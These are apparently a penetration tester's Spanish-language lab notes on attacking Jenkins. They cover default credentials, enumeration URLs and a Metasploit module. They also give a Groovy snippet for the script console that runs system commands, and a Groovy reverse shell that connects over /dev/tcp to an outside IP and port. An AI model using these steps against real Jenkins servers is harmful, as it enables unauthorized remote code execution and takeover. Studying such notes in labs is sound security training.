### INFO

- Es un servidor de automatización escrito en java.
- Corre en un servlet container como Tomcat.
- Suele correr con permitos de system en windows.
- Suele correr en Tomcat en el puerto 8080 por default. Usa el puerto 5000 para usar slave servers.
- Es comun encontrar jenkins con contraseñas por defecto: admin:admin

### ENUM

    http://jenkins.inlanefreight.local:8000/configureSecurity/

#### Metasploit

    auxiliary/scanner/http/jenkins_enum

##### Login page:

    http://jenkins.inlanefreight.local:8000/login?from=%2F

### Explotación

#### Script Console

La script console funciona como una webshell, puede encontrarse en:

        http://jenkins.inlanefreight.local:8000/script

Desde la script console podemos correr comandos con el siguiente script:

        def cmd = 'id'
        def sout = new StringBuffer(), serr = new StringBuffer()
        def proc = cmd.execute()
        proc.consumeProcessOutput(sout, serr)
        proc.waitForOrKill(1000)
        println sout

Podemos también generar una reverse shell:

        r = Runtime.getRuntime()
        p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
        p.waitFor()

